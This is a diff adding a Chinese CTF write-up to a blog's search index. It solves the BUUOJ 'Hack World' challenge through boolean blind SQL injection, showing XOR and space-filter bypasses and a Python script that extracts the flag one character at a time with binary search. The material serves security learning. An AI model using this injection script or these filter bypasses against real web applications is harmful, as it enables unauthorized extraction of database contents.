@@ -579,8 +579,56 @@
 ]]></content>
   </entry>
   <entry>
-    <title>web-7</title>
+    <title>web-7buuoj[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
     <url>/2020/12/25/web-7/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><blockquote>
+<ul>
+<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
+<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
+<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+<ul>
+<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
+<li>一个输入框，大概是要sql注入了，经过判断是数字型注入。</li>
+<li>观察回显，判断应该是bool型盲注。</li>
+<li>检查一下被过滤的各种字符和关键词。</li>
+<li>利用python脚本进行爆破。</li>
+</ol>
+</li>
+<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
+<li><p>post提交id=1，回显正确，提交id=1’报错，判断是单引号闭合。</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.2.png?raw=true"></p>
+</li>
+<li><p>只回显对错而不是完整的错误信息，这里大概是要盲注了，先试试and，or几个关键词有没有被过滤。</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.3.png?raw=true"></p>
+<p>and，or都被滤了，那可以考虑用^运算来绕过。</p>
+</li>
+<li><p>在这之前我们发现空格也被过滤了，经过尝试发现(),%0a,tab等字符可以绕过空格，小括号没有过滤也意味着我们能自由地使用盲注时需要的一些函数。接下来尝试select等关键词有没有被过滤。</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.4.png?raw=true"></p>
+<p>select，from都能正常表达，下面开始尝试构造注入字段。</p>
+</li>
+<li><p>因为这里用^，0^1=1,1^1=1，所以可以构造0^(sql判断语句)，如果sql语句返回为true，页面正常回显，否则错误回显。又因为题目已经提醒了，flag在flag表的flag的列中，所以可以构造如下sql语句：</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.5.png?raw=true"></p>
+</li>
+<li><p>基本的思路已经有了，然后写个脚本跑一下就行了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://26204341-4999-42c6-a88d-986ee280d68e.node3.buuoj.cn&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r):</span><br><span class="line">        payload[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&#x27;0^&#x27;</span> + <span class="string">&#x27;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        html = requests.post(url, data=payload)</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag。</p>
+</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ol>
+<li>关于空格的绕过姿势。/**/, (), tab, %0b……</li>
+<li>盲注支持与，或，异或等多种逻辑判断，本质是构造一个返回值是0或1的语句来进行判断。</li>
+<li>python网络编程（别催了寒假一定）</li>
+</ol>
+</li>
+</ul>
+]]></content>
   </entry>
 </search>
